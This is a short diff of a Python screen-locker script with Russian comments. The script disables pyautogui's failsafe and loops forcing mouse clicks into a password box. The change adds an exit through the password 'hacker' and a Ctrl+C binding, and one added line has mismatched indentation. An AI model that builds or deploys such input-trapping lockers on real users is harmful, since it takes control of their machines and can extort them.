@@ -26,10 +26,18 @@ entry.place(x=x/2-150, y=y/2+20)
 # Вырубаем защиту левого верхнего угла экрана
 pyautogui.FAILSAFE = False
 #---------------------------------
-while True:
+stop = True
+while stop == True:
 	root.update()
 	# Кликаем в центр окна
 	click(x=x/2-150, y=y/2+20)
+	
+	# Добавляем сочетание клавиш, которые будут закрывать программу
+    root.bind('<Control-KeyPress-c>', stopLocker)
+	
+	if entry.get() == 'hacker':
+		stop = False
+
 time.sleep(100)
 
 
